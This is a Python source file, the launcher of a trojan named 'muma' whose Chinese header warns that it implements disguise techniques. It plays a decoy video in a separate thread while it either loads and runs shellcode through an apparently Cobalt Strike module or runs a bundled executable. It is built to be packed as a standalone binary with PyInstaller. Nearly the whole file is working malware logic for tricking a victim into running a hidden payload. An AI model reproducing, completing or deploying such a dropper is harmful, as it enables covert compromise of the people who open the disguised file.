# WARNING: 本模块包含伪装技术实现
# 根据《网络安全法》规定，未经授权使用将面临刑事指控


import subprocess
import threading
import os,sys
import muma_play
import muma_benti
import analysis

class muma_run(threading.Thread):
    def __init__(self):
        super().__init__()

    def analy_type(self):
        result=analysis.read_confs(self.get_resource_path("conf.txt"))
        self.dfile=os.path.basename(result["dfile"])
        self.vfile = os.path.basename(result["vfile"])
        self.type=result["type"]

    def get_resource_path(self, relative_path):
        # 查找视频文件
        if hasattr(sys, '_MEIPASS'):
            return os.path.join(sys._MEIPASS, relative_path)
        return os.path.join(os.path.abspath("."), relative_path)

    def start_video(self):
        #此处更改播放文件位置
        pa=self.get_resource_path("files\\"+self.dfile)
        self.file=muma_play.video_play(pa)
        self.file.play_video()

    def start_cs(self):
        cs=muma_benti.cs_run()
        cs.set_shellcode()
        cs.run_cs()

    def start_execs(self):
        path=self.get_resource_path("files\\"+os.path.basename(self.vfile))
        subprocess.run(path)

    def run_trojan(self):
        self.analy_type()
        if self.type=="py":
            thread1 = threading.Thread(target=self.start_video)
            thread1.start()
            self.start_cs()
        if self.type=="exe":
            thread1 = threading.Thread(target=self.start_video)
            thread1.start()
            self.start_execs()




if __name__=="__main__":
    muma=muma_run()
    muma.run_trojan()